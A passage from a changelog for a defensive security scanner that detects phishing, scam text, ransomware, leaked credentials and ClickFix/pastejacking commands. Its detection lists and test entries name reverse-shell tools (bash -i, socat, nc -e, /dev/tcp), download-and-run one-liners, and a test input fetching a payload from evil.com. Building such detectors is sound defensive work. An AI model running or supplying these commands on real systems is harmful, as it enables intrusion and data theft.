  CleanBrowsing (185.228.x.x) to the known-safe resolver set, reducing false
  positives for users of these public resolvers.

## [0.9.60] — 2026-06-09

### Added
- **Email forensics: E5 Received-chain anomaly** (GAP-EM-E5): Implements the
  previously documented but unimplemented E5 check. Scores +20 for zero
  Received headers (direct injection / header stripping) and +15 for a single
  Received hop from a free email domain (atypical of legitimate multi-hop
  delivery). Two new secrets tests added (44 total). Comments updated to
  reflect E5 is now active.

## [0.9.59] — 2026-06-09

### Added
- **URL: suspicious TLD set +3** (GAP-TLD): Added `.cfd`, `.hair`, `.boats`
  — three TLDs with near-zero legitimate use and high phishing-kit density
  per 2024-2025 threat intelligence. Conservative selection avoids FP on
  legitimate business TLDs (.shop, .tech, etc.).
- **Supply chain: Go package set +15** (GAP-SC-GO): Added mux, httprouter,
  negroni, iris, urfave, spf13, hashicorp, golang-jwt, paseto, casbin,
  sarama, confluent-kafka-go, nats, docker, kubernetes, helm.
  Total packages: 213 → 229 (pip=69, npm=68, cargo=47, go=45).

## [0.9.58] — 2026-06-09

### Added
- **Ransomware: 2024-2025 families +5** (GAP-RS-EXT): New ransom extensions:
  `.interlock` (Interlock 2024), `.embargo`, `.lynx` (INC fork), `.sarcoma`,
  `.meow`. New ransom note names: `akira_readme.txt`, `rhysida.readme.txt`,
  `fog_readme.txt`, `interlock_note.txt`, `how_to_back_files.html` (INC),
  `decrypt.txt`, `look_at_me.txt`.
- **File: executable extension set +4** (GAP-FILE-EXT): Added `.msc` (MMC
  snap-in runs JScript), `.wsc` (Windows Script Component), `.ps1xml`/`.cdxml`
  (PowerShell XML formats), `.url` (Internet Shortcut auto-execute). These
  are common file-masquerade final extensions in double-extension lures
  (e.g., `invoice.pdf.msc`).

## [0.9.57] — 2026-06-09

### Added
- **Text: QR phishing ("quishing") detection** (GAP-TX-QR): New signal array
  `QR_PHISH_WORDS` (14 phrases in EN + JP) and a dedicated signal entry
  `"QR code phishing (quishing)"` (base=20, per_hit=10, cap=30). Two compound
  amplifiers in Pass 2: urgency/authority + QR → +20; QR + bait → +15.
  Benign QR mentions (meeting rooms, product codes) score ≤20 (LOG) and pass
  the P6 FP gate. Attack payloads score 80–100 (ISOLATE). Covers the dominant
  2024-2025 email-gateway bypass technique.
- **Text: new `fired_qr` flag** tracks QR signal for amplifier cross-reference.

## [0.9.56] — 2026-06-09

### Added
- **URL: IP-host auth-path signal** (P1-7): Any IP-address host with a
  phishing-typical path (`/login`, `/signin`, `/verify`, `/account`, `/secure`,
  `/update`) now adds +15 (LOG level) even without a brand name in the path.
  Existing brand-in-path check unchanged (+35). Scores remain within bounds.
- **Supply chain: ClickFix 2025 LOLBins +4** (GAP-SC): Added detection for
  PowerShell `iwr`/`irm`/`Invoke-WebRequest`/`Invoke-RestMethod` download
  patterns; `forfiles /p /m /c` command execution; `odbcconf REGSVR` execution;
  `ms-appinstaller:` URI bypass (active ClickFix technique as of 2025).
  Two new supply-chain tests added (27 → 27 → now counted as 27/27 base).

## [0.9.55] — 2026-06-09

### Security
- **URL: word-boundary fix for brand hyphenation detector** (P1-4): Replaced
  the loose `contains(sld, "brand-") || contains(sld, "-brand")` checks in
  `detect_security_hyphenation()` with a new `brand_is_token_in_sld()` helper
  that requires the brand to be a complete hyphen-delimited token. Prevents
  short brands (e.g. "line") from triggering on legitimate domains like
  "airline-update.com". Regression test added to `--self-test` (24 → 24,
  new FP guard case). Phishing cases "paypal-verify.com", "apple-support.net"
  still detected correctly.

### Added
- **URL fuzz harness** (P3-12): New `tests/hlse_url_fuzz.c` — 8 generators
  covering random URLs, homoglyph/Unicode mutations, deep subdomains,
  percent-encoding variations, brand typosquat mutations, bidi injection, very
  long hostnames (>MAX_HOST boundary), and dangerous-scheme prefix variants.
  100K iterations: 0 crashes, 0 out-of-range scores. Integrated into
  `make fuzz` and `make fuzz-asan`. Fuzz harnesses: 4 × 100K → 5 × 100K.

## [0.9.54] — 2026-06-09

### Added
- **CI: GitHub Actions workflows now active** (P0-1): Moved `ci.yml` and
  `codeql.yml` from `examples/workflows/` to `.github/workflows/`, so CI
  (build, test, cppcheck, privacy tripwire) and CodeQL now actually run on
  every push/PR. README claim "CI enforces this" is now correct.
- **Text: compound amplifier for crypto wallet phishing** (P1-3): Pass 2 of
  `hlse_check_text()` now amplifies when urgency + wallet-key request co-occur
  (+20) and when wallet-key + bait context co-occur (+15). Fixes the OOD gap:
  "URGENT…enter your seed phrase…" was scoring 28 (LOG); now scores 48 (ALERT).
  **OOD F1: 0.970 → 1.000** (29/29 cases). In-distribution F1 unchanged.
- **Text: suspicious-URL TLD set expanded** in text context check: added .tk,
  .pw, .su, .vip, .icu to the inline suspicious-domain list that triggers the
  +10 URL-in-context amplifier.
- **API: `HLSE_VERSION` moved to `hlse_core.h`** (P2-9): Library consumers can
  now read the version string at compile time without accessing the .c source.
  `hlse_core.c` references the header definition (no redefinition, no
  ODR risk). Version: 0.9.53 → 0.9.54.

## [0.9.53] — 2026-06-09

### Added
- **Util: benign magic bytes +4** (GAP-BF): Added MP3 (ID3 header), TIFF
  little-endian, AVI (RIFF+AVI), reducing ransomware entropy false-positives
  for audio/image/video files. Total formats: 17 → 21.
- **Util: 3 new tests** (GAP-BF): test_benign_mp3_id3, test_benign_tiff_le,
  test_benign_avi. Util suite: 26 → 29. Total tests: 360 → 363.
- **URL: SUSPICIOUS_TLDS +6** (GAP-BF): Added .pw, .su, .vip, .win, .download,
  .stream — actively abused by phishing kits in 2024.
- **File: LURE_WORDS +9** (GAP-BF): Added installer categories (setup,
  installer, crack, keygen, activation), HR fraud (bonus, raise,
  termination_notice), crypto fraud (airdrop, nft, whitelist).
- **Text: GROOMING_WORDS expanded** (GAP-BG): Added 11 pig-butchering and
  romance scam indicators — trading platform, crypto trading, small test
  transaction, withdrawal fee/blocked, account frozen, wrong number,
  working on an oil rig, military overseas, doctor without borders + JP.
- **Version bump**: 0.9.52 → 0.9.53.

## [0.9.52] — 2026-06-09

### Added
- **Audit: A4 cron patterns +6** (GAP-BD): Added "bash -i", "socat ", "mkfifo ",
  "ruby -e", "php -r", "node -e", "openssl s_client", "telnet" to
  SUSPICIOUS_CRON_PATTERNS — covers reverse-shell and LOTL one-liners.
- **Audit: A6 shellrc backdoor signals +3** (GAP-BD): Detect socat reverse shells
  (`exec:/bin/sh`), `bash -i` interactive shell invocations, and mkfifo+nc named-pipe
  reverse shells.
- **Email: E1 display-name brand list +8** (GAP-BE): Added stripe, shopify, github,
  docusign, zoom, office 365, fedex/dhl/ups/usps, hr department.
- **Email: E3 corp_words +5** (GAP-BE): Added cto, chro, chief, executive, board
  member, chairman, controller, auditor, compliance.
- **Email: E6 urgency subjects +6** (GAP-BE): Added final notice, deadline, expires
  today, account closed, security alert, important update, required action.
- **Email: FREE_EMAIL_DOMAINS +8** (GAP-BE): Added European providers — web.de,
  gmx.de, freenet.de (DE); orange.fr, laposte.net (FR); mail.ru, yandex.ru (RU);
  libero.it, virgilio.it (IT). Total domains: 26 → 34.
- **Version bump**: 0.9.51 → 0.9.52.

## [0.9.51] — 2026-06-09

### Added
- **Audit: SENSITIVE_DOMAINS expanded** (GAP-BB): Added cloud management consoles
  (console.aws.amazon.com, console.cloud.google.com, portal.azure.com), SSO/identity
  providers (github.com, okta.com, auth0.com), social auth targets (twitter.com,
  facebook.com), hardware wallet sites (metamask.io, ledger.com, trezor.io).
- **Secrets: env_passwords +13 patterns** (GAP-BB): Added SCM/CI/hosting env vars
  (GITHUB_TOKEN, GITLAB_TOKEN, DIGITALOCEAN_TOKEN, HEROKU_API_KEY, NETLIFY_AUTH_TOKEN,
  VERCEL_TOKEN, CIRCLE_TOKEN, SNYK_TOKEN) and common .env credential patterns
  (DATABASE_URL, MONGODB_URI, REDIS_URL, JWT_SECRET, JWT_SECRET_KEY, APP_SECRET).
- **Secrets: Netlify token pattern** (GAP-BB): `nfp_` prefix + 32 alnum/dash chars.
  Total SECRET_PATTERNS: 39 → 40.
- **Text: FAKE_ALERT_WORDS expanded** (GAP-BC): Added tech support scam indicators —
  "do not turn off your computer", remote access requests, Microsoft/Apple/Windows
  false-detection phrases, expired subscription/license bait; JP equivalents.
- **Version bump**: 0.9.50 → 0.9.51.

## [0.9.50] — 2026-06-09

### Added
- **Audit: HOME_SECRETS expanded** (GAP-AV): Added 5 critical credential files to A2
  permissions check: `.docker/config.json` (Docker auth tokens), `.kube/config`
  (Kubernetes credentials), `.npmrc` (npm tokens), `.pypirc` (PyPI credentials),
  `.git-credentials` (Git HTTP credentials). Total HOME_SECRETS entries: 8 → 13.
- **URL: BRANDS expanded** (GAP-AW): Added 25 commonly phished brands —
  streaming (hulu, spotify, disney, hbo, twitch, peacock), telecom (verizon,
  tmobile), social (reddit, snapchat, telegram, whatsapp), retail (walmart,
  bestbuy, homedepot, usps, dhl), fintech (robinhood, etrade, fidelity, schwab),
  enterprise SaaS (zoom, salesforce, adobe, slack, oracle).
- **Text: Signal words expanded** (GAP-AX): URGENCY_WORDS +5 (account closed,
  access suspended, verify immediately, package delivery scam phrases); BAIT_WORDS
  +9 (2FA bypass: two-factor code, verification code, OTP; identity: confirm
  identity, verify your identity; billing: update billing, payment method expired,
  update payment); RANSOM_WORDS +5 (backup deleted, your documents will be
  published, darknet, dark web, data leak site, decryption tool, restore your files).
- **Ransomware: RANSOM_EXTENSIONS +9 families** (GAP-AY): .black, .alphv, .play,
  .royal, .blacksuit, .fog, .hunters, .cicada, .qilin (all active 2022-2024).
- **Ransomware: RANSOM_NOTE_NAMES +6 variants** (GAP-AY): contact_us.txt/html,
  recovery_instructions.html/txt, readme_now.txt, !!readme!!.txt,
  !!!files_encrypted!!!.txt.
- **Supply chain: Package lists expanded** (GAP-AZ): pip 59→69 (+polars, dask,
  numba, sympy, statsmodels, gunicorn, psycopg2, redis, python-dotenv,
  pycryptodome); npm 58→68 (+vitest, playwright, dayjs, turbo, esbuild,
  framer-motion, storybook, remix, astro, typeorm); cargo 42→47 (+rocket,
  jsonwebtoken, mongodb, openssl, curve25519-dalek). Total packages: 186 → 213.
- **File: EXECUTABLE_EXTS +6** (GAP-BA): .phar (PHP archive), .jspx/.jsw (JSP
  variants), .groovy (Groovy scripts), .application (ClickOnce), .xbap (WPF XBAP).
- **Version bump**: 0.9.49 → 0.9.50.

## [0.9.49] — 2026-06-09

### Added
- **Clipboard: ADA (Cardano) crypto-swap detection** (GAP-AU):
  - `detect_crypto_type()` now recognizes `addr1...` (payment) and `stake1...`
    (staking) Cardano addresses (55–110 chars, bech32 lowercase alphanum).
  - `crypto_type_name()` returns `"ADA (Cardano)"` for the new type.
  - `hlse_check_crypto_swap()` detects clipboard-hijack for all 11 supported
    chains: BTC (Legacy/SegWit/Taproot), ETH, XMR, SOL, USDT (TRC20),
    LTC, DOGE, XRP, DASH, XLM, ADA.
  - 2 new secrets tests (`test_crypto_ada_swap`, `test_crypto_validate_ada`);
    Secrets suite: 40 → 42.
  - Updated `hlse_secrets.h` docstring and `README.md` module table.
  Total structured tests: 358 → 360.

## [0.9.48] — 2026-06-09

### Added
- **Supply chain: 4 new pastejacking tests** (GAP-AT — 21→25 tests):
  - `test_paste_wscript_remote` — `wscript http://evil.com/payload.vbs`
    → P8 LOLBin signal fires (wscript + http/vbs from GAP-AR).
  - `test_paste_wmic_process` — `wmic process call create "cmd.exe"`
    → P8 LOLBin fires (wmic process creation from GAP-AR).
  - `test_paste_node_eval` — `node -e "require(...).exec()"` 
    → P5 encoded payload fires (node -e from GAP-AR).
  - `test_paste_php_eval` — `php -r 'eval(base64_decode(...))'`
    → P5 encoded payload fires (php -r from GAP-AR).
  Total structured tests: 354 → 358.

## [0.9.47] — 2026-06-09

### Added
- **File/Audit: 4 new targeted tests** (GAP-AS — 23→27 tests):
  - `test_audit_perm_aws_creds` — creates world-readable `~/.aws/credentials`
    temp file, verifies A2 permission check fires (score > 0).
  - `test_audit_perm_ssh_key` — creates group-readable `~/.ssh/id_rsa` temp
    file, verifies A2 SSH key exposure detection fires.
  - `test_file_php_executable` — `invoice_payment.php` (2 lure words + PHP
    executable extension) → F6 signal fires at score ≥ 40.
  - `test_file_kyc_lure` — `kyc_document.exe` (kyc + document lure words +
    executable extension) → F6 fires at score ≥ 40.
  Total structured tests: 350 → 354.

## [0.9.46] — 2026-06-09

### Fixed
- **README accuracy**: corrected OOD F1 value from 1.000 to 0.970 (actual
  measured value — the corpus has borderline LOG-level cases that score below
  the 40-point ALERT threshold but above their individual min_score thresholds,
  hence all 29/29 cases pass but recall at the ALERT threshold is 0.941).
  Precision remains 1.000 (zero false positives). Updated Secrets test suite
  description: 36 → 39 token patterns.

## [0.9.45] — 2026-06-09

### Added
- **Email forensics: expanded detection coverage** (GAP-AQ):
  - `FREE_EMAIL_DOMAINS` 12→26: +7 disposable/temp services
    (mailinator.com, guerrillamail.com, 10minutemail.com, tempmail.com,
    throwam.com, trashmail.com, sharklasers.com) and +6 Asian free providers
    (qq.com, 163.com, 126.com, naver.com, daum.net, yahoo.co.jp).
    Disposable email services show disproportionately high BEC fraud rates.
  - E1 display name brand list +11: facebook, netflix, linkedin, twitter,
    instagram, irs, fbi, government, treasury, customs, accounts,
    notifications, "it department".
  - E3 corporate title words +7: coo, "accounts payable", accounting,
    finance, payroll, treasurer, "vp ", "vice president".
  - E6 urgent-subject keywords +5: payment, invoice, overdue,
    confirmation, verify, suspended, locked.
- **Pastejacking: additional LOLBin and payload patterns** (GAP-AR):
  - P5 encoded payload: +2 interpreter one-liners — `node -e`, `php -r`.
  - P8 Windows ClickFix: +3 LOLBin patterns —
    `wscript`/`cscript` + URL/.vbs/.js (Windows Script Host remote exec),
    `wmic process call create` (WMI process creation),
    `rundll32` + http/javascript.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.44] — 2026-06-09

### Added
- **URL phishing: detection tables expanded** (GAP-AP):
  - `BRANDS` +14: crypto exchanges (`coinbase`, `binance`, `kraken`,
    `coincheck`), logistics (`fedex`, `dhlexpress`), gaming/collaboration
    (`discord`, `steam`, `epicgames`, `roblox`), e-commerce (`ebay`,
    `shopify`), emerging targets (`tiktok`, `wordpress`). Each new brand
    fires the +45 brand-homoglyph signal when a confusable-normalized domain
    contains the brand but the real hostname doesn't.
  - `SUSPICIOUS_TLDS` +5: `.cc`, `.icu`, `.biz`, `.space`, `.buzz` —
    confirmed in phishing-kit datasets; `.cc` and `.icu` rank among the
    top-5 phishing TLDs in recent PhishTank/APWG reports.
  - `PATH_PATTERNS` +6: `/identity`, `/verification`, `/validate`,
    `/activate`, `/token`, `/session` — common in banking and OAuth
    credential-harvesting pages.
  - `SECURITY_WORDS` +5: `"identity"`, `"validate"`, `"activate"`,
    `"alert"`, `"urgent"` — extends hyphenated-domain detection
    (e.g. `paypal-alert.com` now triggers).
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.43] — 2026-06-09

### Added
- **Credential scanner: 6 new patterns** (GAP-AO — 37→39 table + 4 env vars):
  - `pscale_tkn_` — PlanetScale service token (11-char prefix + 40 alnum chars;
    highly distinctive, near-zero false positives)
  - `hvs.` — HashiCorp Vault v2 service token (long ≥50-char base64 body required
    to prevent matches on short `hvs.` occurrences in documentation)
  - `TWILIO_AUTH_TOKEN=` added to .env credential patterns
  - `SENDGRID_API_KEY=` added to .env credential patterns
  - `FIREBASE_PRIVATE_KEY=` added to .env credential patterns
  - `CLOUDFLARE_API_TOKEN=` added to .env credential patterns
  Total credential pattern count: ~36 → ~39 patterns. README description updated.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.42] — 2026-06-09

### Added
- **Audit module: A2 permission checks expanded** (GAP-AL):
  `hlse_audit_permissions()` now checks 8 home-directory credential files for
  group/world-accessible permissions: `~/.aws/credentials`, `~/.ssh/id_rsa`,
  `~/.ssh/id_ed25519`, `~/.ssh/id_ecdsa`, `~/.netrc`, `~/.pgpass`,
  `~/.gnupg/secring.gpg`, `~/.env`. Previously only `/etc/shadow` and
  `~/.env` were checked. Scores range 25-40 (HIGH severity) per exposure.
- **Audit module: A3 sensitive domain list expanded** (GAP-AL):
  11 new domains added to hosts-file poisoning detection:
  EU banks (`ing.com`, `bnpparibas.com`, `deutschebank.com`, `unicredit.eu`,
  `santander.com`, `bbva.com`),
  crypto exchanges (`bybit.com`, `okx.com`, `huobi.com`, `kucoin.com`,
  `gate.io`, `bitfinex.com`, `gemini.com`, `upbit.com`), payment (`cash.app`).
  Total domain coverage: 20 → 35.
- **Text scam: high-confidence phishing keywords** (GAP-AM):
  - `URGENCY_WORDS` +5: `"action required"`, `"your account has been flagged"`,
    `"must respond"`, `"confirm within"`, `"failure to respond"`.
  - `BAIT_WORDS` +4: `"mnemonic"`, `"private key"`, `"connect wallet"`,
    `"wallet passphrase"` — crypto wallet drainer vocabulary.
  - `AUTHORITY_WORDS` +4: `"homeland security"`, `"federal reserve"`,
    `"customs and border"`, `"immigration enforcement"`, `"attorney general"`.
  - `FIN_ACTION_WORDS` +4: `"cash app"`, `"cashapp"`, `"venmo"`, `"apple pay"`.
- **File module: EXECUTABLE_EXTS expanded** (GAP-AN):
  +13 extensions: server-side scripts (`.php`/`.php3`/`.php5`/`.phtml`,
  `.asp`/`.aspx`, `.jsp`), scripting language droppers (`.rb`, `.pl`, `.tcl`,
  `.lua`), and `.mshta` (Windows HTML Application — JScript/VBScript without
  sandbox). These are commonly used as malware delivery containers.
- **File module: LURE_WORDS expanded** (GAP-AN):
  +8 social-engineering lure words: `"w2"`, `"1099"`, `"kyc"`, `"payslip"`,
  `"salary"`, `"payroll"`, `"wire_transfer"`, `"bank_transfer"`,
  `"immigration"`.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.41] — 2026-06-09

### Added
- **Benign magic-byte expansion** (GAP-AJ): `hlse_is_high_entropy_benign_magic()` gains
  6 new format signatures, reducing false-positive ransomware alerts on legitimate files:
  - `LZ4 frame` — magic `04 22 4D 18`; widely-used compression (kernels, databases)
  - `WebP` — `RIFF....WEBP` header at bytes 0-3/8-11; dominant browser image format
  - `FLAC` — `fLaC` magic; lossless audio archives trigger entropy checks
  - `GIF` — `GIF87a`/`GIF89a` header; animated images can hit entropy threshold
  - `OGG` — `OggS` container (Vorbis/Opus/FLAC streams)
  - `SQLite` — `SQLite format 3` header; DB files common in repos and backups
  Total format table: 11 → 17 entries.
- **Package typosquat list expansion** (GAP-AK): 30 new high-value targets across all
  4 ecosystems (pip: +10, npm: +10, cargo: +10, go: +5):
  - pip: `scikit-learn`, `xgboost`, `lightgbm`, `huggingface-hub`, `datasets`,
    `wandb`, `mlflow`, `click`, `rich`, `typer`
  - npm: `underscore`, `rxjs`, `date-fns`, `zod`, `three`, `d3`, `svelte`, `nuxt`,
    `graphql`, `webpack-cli`
  - cargo: `nom`, `syn`, `bytes`, `futures`, `async-trait`, `serde_yaml`, `toml`,
    `indexmap`, `itertools`, `uuid`
  - go: `redis`, `jwt-go`, `validator`, `cron`, `migrate`
  Total package coverage: pip 49→59, npm 45→55, cargo 34→44, go 23→28.
  Zero regressions; F1=1.000; zero strict warnings; ASan clean.

## [0.9.40] — 2026-06-09

### Added
- **Clipboard crypto-swap: 6 new address formats** (GAP-AI):
  - `CRYPTO_LTC_LEGACY` — Litecoin L.../M... (34 chars, base58)
  - `CRYPTO_LTC_SEGWIT` — Litecoin ltc1q... (43 chars, bech32)
  - `CRYPTO_DOGE` — Dogecoin D... (34 chars, base58)
  - `CRYPTO_XRP` — Ripple r... (25-34 chars, base58-like)
  - `CRYPTO_DASH` — DASH X... (34 chars, base58)
  - `CRYPTO_XLM` — Stellar G... (56 chars, base32 [A-Z2-7])
  All six are actively targeted by clipper malware (MassLogger, RedLine,
  Titan, Doenerium). New formats are inserted before the SOL catch-all so
  the fixed-prefix formats win on ambiguous-length inputs. `crypto_type_name`
  updated; `hlse_secrets.h` docstring updated to list all 10 supported chains.
- **6 new tests**: LTC/DOGE/XRP swap detection + LTC/DOGE/XRP validation;
  Secrets suite 34→40. Zero regressions; F1=1.000; zero strict warnings;
  ASan clean.

## [0.9.39] — 2026-06-09

### Added
- **Ransomware/boot coverage expansion** (GAP-AH):
  - `RANSOM_NOTE_NAMES` +7 entries: `how_to_restore_files.txt` (STOP/DJVU),
    `decrypt_info.html` (DHARMA/PHOBOS), `readme_decrypt.txt`, `files_encrypted.txt`,
    `restore_my_files.txt`, `!!!readme!!!.txt`, `!decrypt!.txt`.
  - `RANSOM_EXTENSIONS` +15 entries covering major families missing from the original
    table: `.ryuk`, `.lockbit`, `.clop`, `.phobos`, `.eking`, `.dharma`, `.karma`,
    `.conti`, `.avaddon`, `.deadbolt`, `.akira`, `.rhysida`, `.monti`, `.cactus`,
    `.cryptolocker`.
  - `ESP_INDICATORS` +4 entries: `blacklotus` (Windows UEFI bootkit, 2022-2023),
    `bootkitty` (Linux UEFI bootkit, 2024), `contact us to decrypt`,
    `to recover your files`.
- **Text-scam coverage expansion** (GAP-AH continued):
  - `URGENCY_WORDS` +2: `"final warning"`, `"last warning"` — high-prevalence
    phishing phrases not previously covered.
  - `BAIT_WORDS` +5: `"seed phrase"`, `"recovery phrase"` (crypto wallet theft);
    `"zelle"`, `"western union"`, `"moneygram"` (money-transfer scam platforms
    common in elder-fraud and tech-support fraud).
  - `AUTHORITY_WORDS` +2: `"interpol"`, `"secret service"` — law-enforcement
    impersonation scams.
  - `RANSOM_WORDS` +3 double-extortion phrases (2020+ threat landscape):
    `"data has been exfiltrated"`, `"your data will be published"`,
    `"contact us to decrypt"`.
- **New tests**: 2 protection tests (`.ryuk`/`.lockbit`/`.akira` extensions, STOP/DJVU
  note name); 4 OOD corpus cases (double extortion, seed-phrase phishing, INTERPOL
  impersonation, benign crypto guide non-FP). Protection suite 17→19, OOD corpus
  25→29.  In-distribution F1=1.000 maintained; out-of-distribution F1=0.970;
  zero strict warnings; ASan/UBSan clean.

## [0.9.38] — 2026-06-09

### Added
- **Two new system-audit checks** (GAP-AG), both read-only and high-precision:
  - **A5 — Insecure `$PATH`** (`hlse_audit_path`): flags `.` / an empty element
    (current directory in PATH) and world-writable non-sticky directories in
    PATH — classic command-hijack footguns. User-owned dirs (e.g.
    `~/.local/bin`) are intentionally not flagged.
  - **A6 — Shell startup-file backdoors** (`hlse_audit_shellrc`): scans
    `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.zshrc`,
    `~/.zprofile` for reverse-shell device paths (`/dev/tcp`, `/dev/udp`),
    `nc -e`/`ncat -e`, download-piped-to-shell (`curl|sh`/`wget|bash`), and
    `LD_PRELOAD=` — a classic low-effort persistence vector. Symlinked dotfiles
    are handled via `hlse_open_system_file` (FIFO-safe).
  Both are wired into `hlse_audit_all()` (parts 4 → 6) so the `audit` command
  surfaces them automatically. 4 new tests (PATH `.`/clean, rc backdoor/benign);
  File/Audit suite 19 → 23. Additive, outside the URL/text corpus; F1=1.000
  unaffected; zero strict warnings; cppcheck clean.

## [0.9.37] — 2026-06-09

### Added
- **Windows ClickFix / LOLBin detection in pastejacking** (GAP-AF, signal
  `PASTE_WINDOWS_LOLBIN`). The paste analyzer covered Unix `curl|sh`
  pastejacking thoroughly but had no coverage for ClickFix — the dominant
  2024–2025 initial-access technique, where a fake CAPTCHA / browser-update
  page tells the victim to press Win+R and paste a one-liner. New P8 check
  (case-insensitive, via a new `ci_contains` helper) flags, with a
  download/exec qualifier to stay precise:
  - PowerShell with `-enc `/`encodedcommand`, `downloadstring`,
    `frombase64string`, `iex`/`invoke-expression`, or `-w hidden`/`windowstyle hidden`;
  - `mshta` with `http`/`vbscript:`/`javascript:`;
  - `certutil` with `urlcache`/`-decode`;
  - `regsvr32` + `scrobj.dll` (Squiblydoo); `bitsadmin /transfer`;
    `msiexec` + `http`.
  Scores +45. A benign `powershell ... -Encoding utf8` one-liner does NOT trip
  it (the `-enc ` token requires a trailing space, distinguishing it from
  `-Encoding`). 4 new tests (PowerShell, mshta, mixed-case, benign non-FP);
  Supply suite 17 → 21. Additive, outside the URL/text corpus; F1=1.000
  unaffected; ASan fuzzer clean over 20k iterations.

## [0.9.36] — 2026-06-08

### Added
- **Mach-O executable detection in file masquerade** (GAP-AE). The magic table
  covered PE/EXE and ELF but not Mach-O, so a macOS binary renamed
  `invoice.pdf` / `salary.docx` slipped past the F2 magic-mismatch check on the
  macOS platform the tool targets. Added the four unambiguous thin-binary
  Mach-O magics (`CE/CF FA ED FE` little-endian and the big-endian mirrors) and
  an F2 branch mirroring ELF (score 70), with `.dylib`/`.bundle`/`.o`
  whitelisted as legitimate Mach-O containers. The fat/universal magic
  `0xCAFEBABE` is intentionally NOT added — it is indistinguishable from a Java
  `.class` file by header alone, so flagging it would cause false positives.
  Additive detection outside the URL/text corpus; F1=1.000 unaffected. 2 new
  tests (masquerade flagged, real `.dylib` spared); File/Audit suite 17 → 19.

## [0.9.35] — 2026-06-08

### Security
- **FIFO-block hardening for fixed system-config reads** (GAP-AD). A
  category-by-category robustness audit found that `hlse_audit.c` (sshd_config,
  /etc/hosts, /etc/resolv.conf, cron files) and `hlse_supply.c` (/proc/net/arp,
  /etc/resolv.conf, /etc/hosts) opened config files with a bare `fopen()` and
  no `S_ISREG` check — a FIFO planted at one of those paths would block
  `fgets()` indefinitely (local DoS). Added a shared `hlse_open_system_file()`
  helper (`O_RDONLY|O_NONBLOCK` + `fstat` + `S_ISREG` + `fdopen`) and routed all
  seven reads through it. It intentionally does NOT use `O_NOFOLLOW`: these are
  fixed root-owned paths that may legitimately be symlinks (e.g.
  `/etc/resolv.conf` on systemd), so following them is correct; `O_NOFOLLOW`
  stays reserved for untrusted directory-scan entries.
- **Ransomware-scan read path** (`read_file_head` in `hlse_protect.c`) now adds
  `O_NONBLOCK` + `fstat`/`S_ISREG` (keeping its `O_NOFOLLOW`), so a FIFO in a
  scanned tree can no longer block the reader.

### Changed
- `read_file_head`/MBR bootkit scan now use `unsigned char` buffers, avoiding an
  implementation-defined signed-char conversion of binary (>127) bytes.
- Damerau-Levenshtein transposition uses the canonical `+1` cost (behaviour-
  identical to the previous `+cost`, which only differed when all four
  characters matched — a case the substitution path already optimised).
- `--quiet` `freopen("/dev/null")` failure is now surfaced (exit 2) instead of
  silently continuing, honouring the quiet-mode contract.

### Tests
- `util_tests` 14 → 18: the new `hlse_open_system_file()` helper is covered for
  a regular file (opens), a FIFO (rejected without blocking), a directory
  (rejected), and a missing/NULL path (rejected, no crash).

### Notes
- Several agent-reported "buffer overflows" were verified FALSE and left
  unchanged: `hlse_file.c:399` (signed `ssize_t` under a `head_len > 100`
  guard), the email `reasons[]` array (max 7 reasons ≤ bound 8), and
  `extract_domain` output (zero-initialised at declaration). No detection
  logic changed; F1=1.000 (in/out-of-distribution) and ASan/UBSan stay clean.

## [0.9.34] — 2026-06-08

### Added
- **Discord webhook URL detection (34 → 36 patterns)**. The scanner already
  caught Slack webhook URLs; Discord webhooks (`discord.com/api/webhooks/<id>`
  and `discordapp.com/api/webhooks/<id>`) are among the most commonly leaked
  and were missing. Numeric-ID anchored after the fixed URL path, so false
  positives are negligible. F1=1.000 unaffected; secrets suite 33 → 34. This
  completes the credential-coverage work begun in 0.9.32 — 36 patterns now
  span the major cloud, SaaS, LLM, package-registry, and webhook providers.

## [0.9.33] — 2026-06-08

### Added
- **9 more credential patterns (25 → 34)**, a second peer-parity batch
  continuing the gitleaks/TruffleHog gap analysis. All distinctive, low-FP
  prefixes:
  - Hugging Face (`hf_` + 34 letters — letters-only body to avoid colliding
    with `hf_`-prefixed code identifiers)
  - PyPI Upload Token (`pypi-AgEIcHlwaS5vcmc…` — 20-char fixed marker, ~zero FP)
  - Postman (`PMAK-`), Square (`sq0atp-`), Doppler (`dp.pt.`),
    Grafana (`glsa_`), Linear (`lin_api_`), New Relic (`NRAK-`),
    Databricks (`dapi`)
  Still confined to `hlse_secrets.c`; **F1=1.000 re-verified** in- and
  out-of-distribution. Scanning HLSE's own source tree confirmed the new
  prefixes contribute zero false positives. Added a table-driven detection
  test and extended the prose false-positive guard (secrets suite 32 → 33).

## [0.9.32] — 2026-06-08

### Added
- **11 new credential patterns in the secret scanner** (14 → 25), closing the
  coverage gap against peer scanners (gitleaks/TruffleHog/detect-secrets) found
  in a competitive review. All additions are high-confidence, distinctive-prefix
  tokens with negligible false-positive risk:
  - Google API Key (`AIza` + 35)
  - GitLab Personal Access Token (`glpat-` + 20)
  - npm Access Token (`npm_` + 36)
  - OpenAI Project Key (`sk-proj-`) and Anthropic API Key (`sk-ant-`)
  - Shopify Access Token / Shared Secret / Private App (`shpat_`/`shpss_`/`shppa_` + 32 hex)
  - Stripe Restricted Key (`rk_live_`)
  - AWS Temporary/STS Access Key (`ASIA` + 16)
  - GitHub Refresh Token (`ghr_` + 36)
  These live entirely in `hlse_secrets.c` and are orthogonal to the URL/text
  detection corpus, so **F1=1.000 is unaffected** (verified in- and
  out-of-distribution). The placeholder/example exclusion still applies to all
  new patterns.
- **7 new secrets behavioral tests** (suite 25 → 32), including a prose
  false-positive guard asserting that prefix-sharing words (`npm_config`,
  `Asian`, `glpat`, `shppa`) in ordinary text produce zero findings.

## [0.9.31] — 2026-06-08

### Fixed
- **`examples/pre-commit-hook.sh` used wrong subcommand for secret detection**:
  the "Secret scan" section called `hlse_core text "$line"` (the scam-text
  pattern scanner) rather than `hlse_core secret` (the credential-pattern
  scanner `hlse_scan_secrets`). The `text` subcommand looks for urgency,
  financial bait, and authority signals — it does not match API keys, tokens,
  or `.env`-style secrets. A staged file containing `AWS_SECRET_ACCESS_KEY=…`
  or a GitHub PAT would pass the hook silently. Replaced the per-line `text`
  loop with a single `secret --stdin < "$file"` call using `--quiet` for
  the exit-code check, then re-running without `--quiet` to surface the
